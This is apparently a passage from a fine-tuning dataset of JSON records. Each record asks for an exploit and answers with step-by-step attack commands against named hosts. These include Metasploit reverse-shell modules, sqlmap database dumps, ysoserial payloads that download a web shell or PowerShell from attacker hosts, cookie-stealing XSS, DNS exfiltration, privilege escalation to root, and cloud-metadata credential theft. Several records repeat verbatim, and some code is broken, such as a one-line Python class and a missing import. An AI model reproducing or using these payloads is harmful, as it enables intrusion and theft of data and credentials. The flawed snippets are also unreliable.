    "output": "Step 1️⃣ — Identify Vulnerability\nRapid reset floods with RST_STREAM after partial data, exhausting server resources.\n\nStep 2️⃣ — Formulate Attack\nUse h2csmuggler or curl with HTTP/2 to send reset streams.\n\nStep 3️⃣ — Execute Attack\n```bash\nh2load -n 1000 -c 1000 -m 64 --header=':method:GET' --header=':path:/' --header=':authority:h2server.com' https://h2server.com/\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Zoho ManageEngine RCE.",
    "input": "Scan on manageengine.com: Zoho ManageEngine 7.0.0 vulnerable to CVE-2021-40539, unauth RCE via API.",
    "output": "Step 1️⃣ — Identify Vulnerability\nAPI endpoint allows file upload and execution without auth.\n\nStep 2️⃣ — Configure Module\nUse the ManageEngine module for shell deployment.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/manageengine_multisite_rce; set RHOSTS manageengine.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD java/jsp_shell_reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure object serialization in session for priv esc.",
    "input": "Finding: Session serialized with pickle in Python, allows injecting __reduce__ gadget for role elevation.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPickle sessions allow gadget injection for arbitrary code on deserialization.\n\nStep 2️⃣ — Create Gadget\nUse __reduce__ to set session['role'] = 'admin'.\n\nStep 3️⃣ — Execute Attack\n```python\npython3 -c 'import pickle; class R: def __reduce__(self): return (setattr, (globals(), \"session\", {\"role\":\"admin\"})); pickle.dump(R(), open(\"session.pkl\", \"wb\"))'\ncurl -b 'session=$(base64 -w0 session.pkl)' https://pyapp.com/dashboard\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the header-based SQL injection for DB enum.",
    "input": "Finding: SQLi in User-Agent header at https://header.com/home, PostgreSQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHeader injection into SQL allows DB interaction via tampering.\n\nStep 2️⃣ — Formulate sqlmap\nUse --headers for User-Agent param.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://header.com/home\" --headers=\"User-Agent:1\" -p User-Agent --dbms=postgresql --dbs\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak Diffie-Hellman parameters for MITM.",
    "input": "Finding: TLS at https://tls.com uses DH group 1 (512-bit), vulnerable to Logjam attack for key recovery.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak DH params allow precomputing for passive MITM key decryption.\n\nStep 2️⃣ — Perform Logjam\nUse sslyze or script to detect, then MITM with weak params.\n\nStep 3️⃣ — Execute Attack\n```python\nimport ssl, socket\ncontext = ssl.create_default_context()\ncontext.set_ciphers('DH:!aNULL')\ns = socket.create_connection(('tls.com', 443))\nssl_sock = context.wrap_socket(s, server_hostname='tls.com')\nprint(ssl_sock.cipher())  # Check DH usage\n# MITM: Use mitmproxy with --set dhparams=weak\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed Kubernetes API server for cluster enum.",
    "input": "Finding: K8s API at https://k8s.com:6443 unauth, allows anonymous get pods.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth API exposes cluster resources for recon and abuse.\n\nStep 2️⃣ — Query Resources\nUse kubectl anonymously or curl.\n\nStep 3️⃣ — Execute Attack\n```bash\nkubectl get pods --server=https://k8s.com:6443 --insecure-skip-tls-verify -n kube-system\ncurl -k https://k8s.com:6443/api/v1/namespaces/default/pods\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the clickjacking on login form.",
    "input": "Finding: Login at https://login.com lacks X-Frame-Options, form submits to /auth.",
    "output": "Step 1️⃣ — Identify Vulnerability\nNo frame options allow overlaying fake UI for credential theft.\n\nStep 2️⃣ — Craft Frame PoC\nHTML with iframe over fake form.\n\nStep 3️⃣ — Execute Attack\nHost PoC:\n```html\n<iframe src='https://login.com' style='opacity:0.5;'></iframe><form action='https://login.com/auth' method='POST' style='position:absolute;'><input name='user' placeholder='User'><input name='pass' type='password' placeholder='Pass'><button>Login</button></form>\n```"
  },
  {
    "instruction": "Generate a two-step chain using deserialization to file upload for persistence.",
    "input": "Finding 1: Deserialization RCE in /session at https://app.com/session. Finding 2: Upload dir /tmp writable.",
    "output": "Step 1️⃣ — Gain RCE\nDeserialize payload to execute commands.\n\nStep 2️⃣ — Upload Backdoor\nFrom RCE, upload persistent shell to web dir.\n\nStep 3️⃣ — Execute Attack\nPayload for wget:\n```bash\njava -jar ysoserial.jar CommonsCollections6 'wget http://attacker.com/shell.jsp -O /var/www/html/backdoor.jsp' > payload.ser\ncurl -X POST --data-binary @payload.ser https://app.com/session\ncurl http://app.com/backdoor.jsp?cmd=id\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the polkit priv esc for root.",
    "input": "Enum: Polkit pkexec vulnerable to CVE-2021-4034 (PwnKit), allows root shell.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nPwnKit in pkexec allows arbitrary code as root.\n\nStep 2️⃣ — Compile Exploit\nDownload and run PoC.\n\nStep 3️⃣ — Execute Attack\n```bash\nwget https://github.com/berdav/CVE-2021-4034/raw/main/pwnkit.c\ngcc pwnkit.c -o pwnkit -w\ngit clone https://github.com/berdav/CVE-2021-4034\ncd CVE-2021-4034 && make && ./pwnkit\n# Or ./pwnkit shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure direct object reference in chat messages.",
    "input": "Finding: Chat API at https://chat.com/api/messages/789 fetches any message ID without sender check, exposing private convos.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR in message IDs allows reading unauthorized private messages.\n\nStep 2️⃣ — Enumerate Messages\nChange ID to access others' chats sequentially.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor id in {500..1000}; do curl -H 'Authorization: Bearer <USER_TOKEN>' \"https://chat.com/api/messages/$id\" | jq '.content'; done\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the DOM-based XSS in client-side routing.",
    "input": "Finding: Router at https://spa.com/#search=<script>alert(1)</script> parses hash without sanitization, executes on load.",
    "output": "Step 1️⃣ — Identify Vulnerability\nDOM XSS in hash param allows client-side script injection.\n\nStep 2️⃣ — Craft Hash Payload\nInject script in URL hash for execution.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://spa.com/#search=<script>document.location=\"http://attacker.com/steal?data=\"+document.cookie</script>'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the PHPMyAdmin auth bypass RCE.",
    "input": "Scan on phpmyadmin.local: phpMyAdmin 4.8.1 vulnerable to CVE-2018-12613, path traversal to config.inc.php for RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTraversal in phpMyAdmin allows reading config for creds and RCE.\n\nStep 2️⃣ — Configure Module\nUse the phpMyAdmin module for traversal and exec.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/phpmyadmin_config_exec; set RHOSTS phpmyadmin.local; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD php/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the weak password policy in LDAP for brute-force.",
    "input": "Finding: LDAP at ldap://auth.com:389 binds with user DN but weak pass policy (min 3 chars), no lockout.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak LDAP policy allows brute-forcing binds.\n\nStep 2️⃣ — Brute with ldapsearch\nUse wordlist for bind attempts.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor pass in {aaa..zzz}; do ldapsearch -x -H ldap://auth.com -D 'uid=admin,ou=users,dc=com' -w $pass -b 'dc=com' '(objectClass=*)' && echo \"Valid: $pass\" && break; done\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the XML-based SQL injection for data dump.",
    "input": "Finding: XML POST at https://xmlsql.com/query with <user id='1'/> injects into SQL, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nXML param injection into SQL allows tag-based payloads.\n\nStep 2️⃣ — Formulate sqlmap\nUse --data with XML, -p for param.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://xmlsql.com/query\" --data=\"<user id=1/>\" -p id --dbms=mysql --dump-all\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the predictable PRNG in session IDs for hijacking.",
    "input": "Finding: Session ID at https://session.com is hex of time() + rand(1000), guessable.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPredictable PRNG in IDs allows enumeration for valid sessions.\n\nStep 2️⃣ — Guess IDs\nScript to generate and test candidates.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, time, random\nbase = int(time.time())\nfor r in range(1000):\n    sid = f'{base:08x}{r:03x}'\n    r = requests.get('https://session.com/profile', cookies={'sid': sid})\n    if 'Welcome' in r.text:\n        print(f'Valid SID: {sid}')\n        break\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed .htaccess for config override.",
    "input": "Finding: .htaccess in /admin writable, allows adding SetHandler application/x-httpd-php for JSP execution.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWritable .htaccess permits handler changes for code exec.\n\nStep 2️⃣ — Override Handler\nUpload .htaccess to enable PHP in .jsp files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X PUT http://site.com/admin/.htaccess -d 'AddType application/x-httpd-php .jsp'\n# Then upload shell.jsp\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the insecure file download with no auth.",
    "input": "Finding: Download at https://files.com/get?file=report.pdf serves any file from /uploads without checks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth file download exposes all uploads.\n\nStep 2️⃣ — Access Arbitrary Files\nChange file param to sensitive paths.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://files.com/get?file=../../../etc/passwd'\n```"
  },
  {
    "instruction": "Generate a two-step chain using command injection to DNS exfil for data leak.",
    "input": "Finding 1: Cmd injection in /ping?host=google.com. Finding 2: nslookup available for DNS queries.",
    "output": "Step 1️⃣ — Encode Data\nPrepare data as subdomain for DNS.\n\nStep 2️⃣ — Inject nslookup\nUse injection to query attacker DNS with data.\n\nStep 3️⃣ — Execute Attack\nData='secret123', encode as secret123.attacker.com\n```bash\ncurl 'http://target.com/ping?host=google.com; nslookup secret123.attacker.com'\n# Check DNS logs for query\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the writable .profile for PATH hijack.",
    "input": "Enum: .profile in /home/user writable, cron runs user scripts with env.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nWritable .profile allows PATH prepend for binary hijack.\n\nStep 2️⃣ — Hijack Command\nAdd malicious dir to PATH in .profile.\n\nStep 3️⃣ — Execute Attack\n```bash\nmkdir /tmp/hijack; ln -s /bin/sh /tmp/hijack/ls\necho 'export PATH=/tmp/hijack:$PATH' >> /home/user/.profile\n# Trigger cron or login as user\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of shared hosting for lateral movement.",
    "input": "Finding: Shared hosting at shared.com/user1 allows symlink to user2's dir via /symlink?target=../user2/public_html/config.php.",
    "output": "Step 1️⃣ — Identify Vulnerability\nShared hosting symlinks enable reading/writing other users' files.\n\nStep 2️⃣ — Create Symlink\nLink to sibling user's sensitive files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://shared.com/symlink?target=../user2/public_html/.env'\n# Access: curl 'http://shared.com/symlink/config.php?cmd=whoami'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the reflected XSS in error message.",
    "input": "Finding: Error page at https://error.com/404?q=<script>alert(1)</script> reflects q param unsanitized.",
    "output": "Step 1️⃣ — Identify Vulnerability\nReflected XSS in error param executes on invalid URLs.\n\nStep 2️⃣ — Craft Payload\nInject script to phish or redirect.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://error.com/404?q=<script>var s=document.createElement(\"script\");s.src=\"http://attacker.com/xss.js\";document.body.appendChild(s);</script>'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Jenkins Groovy script RCE.",
    "input": "Scan on jenkins.com:8080: Jenkins 2.190.3 vulnerable to CVE-2018-1000861, unauth Groovy sandbox bypass for RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJenkins Groovy endpoint allows sandbox escape for code exec.\n\nStep 2️⃣ — Configure Module\nUse the Jenkins module with reverse payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/jenkins_script_console; set RHOSTS jenkins.com; set RPORT 8080; set LHOST <YOUR_IP>; set PAYLOAD java/jsp_shell_reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the broken session management for fixation.",
    "input": "Finding: Session set via /set?sid=abc123, no regeneration on login, allowing pre-set SID hijack.",
    "output": "Step 1️⃣ — Identify Vulnerability\nFixed sessions allow attacker to force victim SID before auth.\n\nStep 2️⃣ — Force SID\nPhish with set link, use SID post-login.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Phish: http://site.com/set?sid=attacker123\ncurl -b 'PHPSESSID=attacker123' http://site.com/profile\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the stored SQL injection for admin creation.",
    "input": "Finding: Stored SQLi in 'comment' at https://blog.com/post-comment, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nStored SQLi persists injection, executing on every view for mass impact.\n\nStep 2️⃣ — Formulate sqlmap\nUse --dbms=mysql --technique=S for stored, --os-shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://blog.com/post-comment\" --data=\"comment=foo&post=1\" -p comment --dbms=mysql --technique=S --os-shell\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak CAPTCHA OCR for automation.",
    "input": "Finding: Login CAPTCHA at https://secure.com/login generates simple text images, bypassable with Tesseract OCR.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak image CAPTCHA allows automated solving for brute-force.\n\nStep 2️⃣ — OCR and Submit\nDownload image, OCR, attempt login.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, pytesseract\nfrom PIL import Image\nsession = requests.Session()\nr = session.get('https://secure.com/login')\nimg = Image.open(io.BytesIO(r.content))\ncaptcha = pytesseract.image_to_string(img).strip()\nsession.post('https://secure.com/login', data={'user':'admin', 'pass':'guess', 'captcha':captcha})\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed SVN repository for source leak.",
    "input": "Finding: SVN at http://svn.com/.svn/entries lists files like /trunk/.env with creds.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed .svn dir reveals source code and secrets.\n\nStep 2️⃣ — Dump Repo\nUse svndumpfilter or curl to fetch.\n\nStep 3️⃣ — Execute Attack\n```bash\nsvn ls file:///svn.com\ncurl http://svn.com/.svn/entries | grep -A10 '^trunk'\n# Download: svn export http://svn.com/trunk\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the mass assignment in user registration.",
    "input": "Finding: Register at https://reg.com/signup binds all JSON params, including 'isAdmin':true.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMass assignment sets unauthorized fields like admin flag.\n\nStep 2️⃣ — Include Priv Fields\nAdd isAdmin in payload.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://reg.com/signup -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"pass\",\"isAdmin\":true}'\n```"
  },
  {
    "instruction": "Generate a two-step chain using LFI to include /proc/self/fd for request smuggling.",
    "input": "Finding 1: LFI in /log.php?file=access.log. Finding 2: Log includes POST data in fd/0.",
    "output": "Step 1️⃣ — Smuggle Request\nInject second request into log via POST.\n\nStep 2️⃣ — Include FD\nLFI /proc/self/fd/0 executes smuggled request.\n\nStep 3️⃣ — Execute Attack\nSmuggle:\n```bash\ncurl -d 'smuggled: GET /admin HTTP/1.1\r\nHost: target\r\n\r\n' http://target.com/log.php?file=access.log\n```\nInclude:\n```bash\ncurl 'http://target.com/log.php?file=/proc/self/fd/0'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the SUID perl for priv esc.",
    "input": "Enum: /usr/bin/perl SUID root, allows BEGIN block for arbitrary code.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nSUID perl executes with root, BEGIN {} runs before script.\n\nStep 2️⃣ — Inject Code\nUse -e for BEGIN shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nsudo /usr/bin/perl -e 'BEGIN{setuid(0);exec(\"/bin/sh\")}'\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of shared hosting for lateral movement.",
    "input": "Finding: Shared hosting at shared.com/user1 allows symlink to user2's dir via /symlink?target=../user2/public_html/config.php.",
    "output": "Step 1️⃣ — Identify Vulnerability\nShared hosting symlinks enable reading/writing other users' files.\n\nStep 2️⃣ — Create Symlink\nLink to sibling user's sensitive files.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://shared.com/symlink?target=../user2/public_html/.env'\n# Access: curl 'http://shared.com/symlink/config.php?cmd=whoami'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the reflected XSS in error message.",
    "input": "Finding: Error page at https://error.com/404?q=<script>alert(1)</script> reflects q param unsanitized.",
    "output": "Step 1️⃣ — Identify Vulnerability\nReflected XSS in error param executes on invalid URLs.\n\nStep 2️⃣ — Craft Payload\nInject script to phish or redirect.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://error.com/404?q=<script>var s=document.createElement(\"script\");s.src=\"http://attacker.com/xss.js\";document.body.appendChild(s);</script>'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Jenkins Groovy script RCE.",
    "input": "Scan on jenkins.com:8080: Jenkins 2.190.3 vulnerable to CVE-2018-1000861, unauth Groovy sandbox bypass for RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJenkins Groovy endpoint allows sandbox escape for code exec.\n\nStep 2️⃣ — Configure Module\nUse the Jenkins module with reverse payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/jenkins_script_console; set RHOSTS jenkins.com; set RPORT 8080; set LHOST <YOUR_IP>; set PAYLOAD java/jsp_shell_reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the broken session management for fixation.",
    "input": "Finding: Session set via /set?sid=abc123, no regeneration on login, allowing pre-set SID hijack.",
    "output": "Step 1️⃣ — Identify Vulnerability\nFixed sessions allow attacker to force victim SID before auth.\n\nStep 2️⃣ — Force SID\nPhish with set link, use SID post-login.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Phish: http://site.com/set?sid=attacker123\ncurl -b 'PHPSESSID=attacker123' http://site.com/profile\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the stored SQL injection for admin creation.",
    "input": "Finding: Stored SQLi in 'comment' at https://blog.com/post-comment, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nStored SQLi persists injection, executing on every view for mass impact.\n\nStep 2️⃣ — Formulate sqlmap\nUse --dbms=mysql --technique=S for stored, --os-shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://blog.com/post-comment\" --data=\"comment=foo&post=1\" -p comment --dbms=mysql --technique=S --os-shell\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak CAPTCHA OCR for automation.",
    "input": "Finding: Login CAPTCHA at https://secure.com/login generates simple text images, bypassable with Tesseract OCR.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak image CAPTCHA allows automated solving for brute-force.\n\nStep 2️⃣ — OCR and Submit\nDownload image, OCR, attempt login.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, pytesseract\nfrom PIL import Image\nsession = requests.Session()\nr = session.get('https://secure.com/login')\nimg = Image.open(io.BytesIO(r.content))\ncaptcha = pytesseract.image_to_string(img).strip()\nsession.post('https://secure.com/login', data={'user':'admin', 'pass':'guess', 'captcha':captcha})\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed SVN repository for source leak.",
    "input": "Finding: SVN at http://svn.com/.svn/entries lists files like /trunk/.env with creds.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed .svn dir reveals source code and secrets.\n\nStep 2️⃣ — Dump Repo\nUse svndumpfilter or curl to fetch.\n\nStep 3️⃣ — Execute Attack\n```bash\nsvn ls file:///svn.com\ncurl http://svn.com/.svn/entries | grep -A10 '^trunk'\n# Download: svn export http://svn.com/trunk\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the mass assignment in user registration.",
    "input": "Finding: Register at https://reg.com/signup binds all JSON params, including 'isAdmin':true.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMass assignment sets unauthorized fields like admin flag.\n\nStep 2️⃣ — Include Priv Fields\nAdd isAdmin in payload.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://reg.com/signup -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"pass\",\"isAdmin\":true}'\n```"
  },
  {
    "instruction": "Generate a two-step chain using LFI to include /proc/self/fd for request smuggling.",
    "input": "Finding 1: LFI in /log.php?file=access.log. Finding 2: Log includes POST data in fd/0.",
    "output": "Step 1️⃣ — Smuggle Request\nInject second request into log via POST.\n\nStep 2️⃣ — Include FD\nLFI /proc/self/fd/0 executes smuggled request.\n\nStep 3️⃣ — Execute Attack\nSmuggle:\n```bash\ncurl -d 'smuggled: GET /admin HTTP/1.1\r\nHost: target\r\n\r\n' http://target.com/log.php?file=access.log\n```\nInclude:\n```bash\ncurl 'http://target.com/log.php?file=/proc/self/fd/0'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the SUID perl for priv esc.",
    "input": "Enum: /usr/bin/perl SUID root, allows BEGIN block for arbitrary code.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nSUID perl executes with root, BEGIN {} runs before script.\n\nStep 2️⃣ — Inject Code\nUse -e for BEGIN shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nsudo /usr/bin/perl -e 'BEGIN{setuid(0);exec(\"/bin/sh\")}'\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure deserialization in Protocol Buffers for RCE.",
    "input": "Finding: gRPC endpoint at https://grpc.com/service uses unsafe protobuf deserialization, vulnerable to gadget chains via ysoserial.net Protobuf.NET.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe protobuf deserialization allows injecting malicious messages for code execution.\n\nStep 2️⃣ — Generate Payload\nUse ysoserial.net to create a protobuf payload for reverse shell.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 6666`.\n```bash\nysoserial.exe -f ProtobufNet -g TypeConfuseDelegate -c 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:80/shell.ps1')\"' > payload.proto\ncurl -X POST --data-binary @payload.proto -H 'Content-Type: application/x-protobuf' https://grpc.com/service\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open redirect in password reset.",
    "input": "Finding: Reset link at https://reset.com/verify?token=abc&return=profile allows return=http://phish.com, no domain check.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOpen redirect in reset flow captures tokens on phish site.\n\nStep 2️⃣ — Craft Redirect\nSet return to attacker URL to steal token from query.\n\nStep 3️⃣ — Execute Attack\nPhish: ```bash\ncurl 'https://reset.com/verify?token=<TOKEN>&return=http://attacker.com/capture'\n# At attacker.com, log ?token= for reset\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Fortinet FortiOS RCE.",
    "input": "Scan on fortigate.com: FortiOS 7.0.5 vulnerable to CVE-2022-40684, unauth RCE via crafted HTTP request.",
    "output": "Step 1️⃣ — Identify Vulnerability\nFortiOS HTTP handler allows command injection for system compromise.\n\nStep 2️⃣ — Configure Module\nUse the FortiOS module with shell payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/linux/http/fortinet_fortios_rce; set RHOSTS fortigate.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD cmd/unix/reverse_bash; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure direct object reference in report generation.",
    "input": "Finding: Report API at https://reports.com/api/report/234 generates PDF for any ID, leaking sensitive HR data.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR in report IDs exposes confidential documents.\n\nStep 2️⃣ — Enumerate Reports\nIncrement ID to download others' reports.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor id in {100..300}; do curl -H 'Authorization: Bearer <TOKEN>' \"https://reports.com/api/report/$id\" -o report_$id.pdf; done\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the blind SQL injection via cookie for user enum.",
    "input": "Finding: Blind SQLi in 'role' cookie at https://roles.com/dashboard, Oracle backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nCookie-based blind SQLi allows inferring data like usernames via conditions.\n\nStep 2️⃣ — Formulate sqlmap\nTarget cookie param with --technique=B.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://roles.com/dashboard\" --cookie=\"role=admin; PHPSESSID=abc\" -p role --dbms=oracle --technique=B --users\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the insecure nonce in JWT for replay.",
    "input": "Finding: JWT at https://jwt.com/validate uses nonce= random(4 digits), reusable within 5 min for replay attacks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nShort-lived but reusable nonce allows replaying signed tokens.\n\nStep 2️⃣ — Capture and Replay\nSniff token, resend before expiry.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, time\n# Capture\ntoken = requests.post('https://jwt.com/action', json={'action':'transfer'}).headers['Authorization']\n# Replay immediately\nrequests.post('https://jwt.com/action', headers={'Authorization': token}, json={'action':'transfer'})\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed H2C endpoint for HTTP/2 smuggling.",
    "input": "Finding: Server at https://h2c.com supports h2c upgrade, vulnerable to request smuggling via prior knowledge.",
    "output": "Step 1️⃣ — Identify Vulnerability\nH2C without TLS allows smuggling by mixing HTTP/1.1 and HTTP/2.\n\nStep 2️⃣ — Smuggle Request\nSend PRI * HTTP/2.0 upgrade with trailing HTTP/1.1 request.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X PRI -H 'Content-Length: 0' --http2-prior-knowledge http://h2c.com -d $'\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\nGET /admin HTTP/1.1\r\nHost: h2c.com\r\n\r\n'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the prototype pollution in YAML config.",
    "input": "Finding: Config upload at https://yaml.com/upload parses YAML with __proto__ pollution, affecting global objects.",
    "output": "Step 1️⃣ — Identify Vulnerability\nYAML loader pollution overwrites prototypes for logic bypass.\n\nStep 2️⃣ — Pollute Config\nSet __proto__.isAdmin = true in YAML.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://yaml.com/upload -H 'Content-Type: text/yaml' -d $'---\n__proto__:\n  isAdmin: true\nuser: guest'\n```"
  },
  {
    "instruction": "Generate a two-step chain using SSRF to access metadata for token theft.",
    "input": "Finding 1: SSRF in /fetch?url=http://external. Finding 2: Internal AWS metadata at http://169.254.169.254/latest/meta-data/iam/security-credentials/role.",
    "output": "Step 1️⃣ — SSRF to Metadata\nSet url to IMDS endpoint.\n\nStep 2️⃣ — Steal Token\nExfil temp creds for AWS abuse.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role' -v\n# Use leaked AccessKeyId in AWS CLI\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the weak sudoers regex for command abuse.",
    "input": "Enum: Sudo allows (root) NOPASSWD: /bin/cat /etc/*, regex allows /etc/passwd but not shadow; abuse with /etc/*shadow.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nLoose regex in sudoers permits unintended file access.\n\nStep 2️⃣ — Abuse Regex\nUse wildcard to match shadow.\n\nStep 3️⃣ — Execute Attack\n```bash\nsudo cat /etc/*shadow\n# Dumps /etc/shadow for hash cracking\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure use of base64 for data encoding in auth token.",
    "input": "Finding: Auth token at Authorization: Basic base64(user:pass) uses no further protection, allowing decoding and replay.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBase64 encoding (not encryption) allows easy decoding of credentials in transit.\n\nStep 2️⃣ — Decode and Replay\nIntercept token, decode, reuse creds.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Decode: echo 'dXNlcjpwYXNz' | base64 -d  # user:pass\n# Replay: curl -u user:pass https://app.com/admin\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the reflected XSS in JSON response.",
    "input": "Finding: API at https://api.com/search?q=<script>alert(1)</script> returns JSON with unsanitized q in error message, parsed as HTML.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJSON with reflected script executes if response parsed as HTML.\n\nStep 2️⃣ — Craft Payload\nInject script in q for execution on error.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://api.com/search?q=<script>fetch(\"http://attacker.com?cookie=\"+document.cookie)</script>' -H 'Accept: text/html'\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Apache Solr RCE.",
    "input": "Scan on solr.com:8983: Solr 8.2.2 vulnerable to CVE-2017-12629, unauth RCE via Velocity template.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSolr VelocityResponseWriter allows template injection for code exec.\n\nStep 2️⃣ — Configure Module\nUse the Solr module with command payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/apache_solr_velocity_rce; set RHOSTS solr.com; set RPORT 8983; set CMD 'id'; run\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure temporary directory for symlink attack.",
